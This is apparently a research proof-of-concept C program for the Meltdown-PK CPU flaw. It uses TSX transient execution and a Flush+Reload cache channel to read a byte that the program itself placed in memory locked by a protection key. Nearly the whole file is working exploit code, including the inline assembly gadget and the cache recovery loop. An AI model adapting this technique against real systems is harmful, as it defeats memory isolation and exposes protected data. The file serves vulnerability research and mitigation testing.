#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sched.h>

#include "libcache/cacheutils.h"

#define SECRET 'S'

int main(void) {
  int status;
  int pkey;
  char *buffer;
  pagesize = sysconf(_SC_PAGESIZE);
  mem = (char*) malloc( pagesize * 256 );
  memset(mem, 1, pagesize * 256);

  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  buffer = mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if(buffer == MAP_FAILED) {
    perror("mmap");
    return EXIT_FAILURE;
  }
  
  // Put some random data into the page (still OK to touch)
  *buffer = SECRET;
  printf("buffer contains: %d\n", *buffer);
  
  // Allocate a protection key:
  pkey = pkey_alloc(0, PKEY_DISABLE_ACCESS);
  if(pkey == -1) {
    perror("pkey_alloc");
    return EXIT_FAILURE;
  }
  
  // Enable access to any memory with "pkey" set,
  // even though there is none right now 
  status = pkey_set(pkey, 0);
  if(status) {
    perror("pkey_set");
    return EXIT_FAILURE;
  }
  
  // Set the protection key on "buffer".
  // Note that it is still read/write as far as mprotect() is
  // concerned and the previous pkey_set() overrides it.
  status = pkey_mprotect(buffer, getpagesize(), PROT_READ | PROT_WRITE, pkey);
  if(status == -1) {
    perror("pkey_mprotect");
    return EXIT_FAILURE;
  }

  printf("Buffer: %d\n", *buffer);

  // Disable access
  status = pkey_set(pkey, PKEY_DISABLE_ACCESS);
  if(status) {
    perror("pkey_set");
    return EXIT_FAILURE;
  }

  printf("about to read buffer with Meltdown-PK...\n");

  // flush memory before access
  flush_shared_memory();

  for(int r = 0; r < 1000000; r++) {
    // ensure data is cached
    pkey_set(pkey, 0);
    maccess(buffer);
    pkey_set(pkey, PKEY_DISABLE_ACCESS);
    // just to be sure...
    mfence();
    nospec();
    sched_yield();

    // TSX begin
    if(try_start()) {
      // Encode data in the cache
      asm volatile("1:\n"
        "movq (%%rsi), %%rsi\n"
        "movzx (%%rcx), %%rax\n"
        "shl $12, %%rax\n"
        "jz 1b\n"
        "movq (%%rbx,%%rax,1), %%rbx\n"
        :
        : "c"(buffer), "b"(mem), "S"(0)
        : "rax");
      try_abort();
    }
    try_end();

    // Recover data from cache covert channel
    for(int i = 1; i < 256; i++) {
      int mix_i = ((i * 167) + 13) % 256;
      if (flush_reload(mem + mix_i * pagesize)) {
        printf("%d ", mix_i);
        fflush(stdout);
      }
    }
  }

  printf("Meltdown-PK done!\n");
  // Free protection key
  if(pkey_free(pkey) == -1) {
    perror("pkey_free");
    return EXIT_FAILURE;
  }

  munmap(buffer, pagesize);
  free(mem);

  return EXIT_SUCCESS;
}
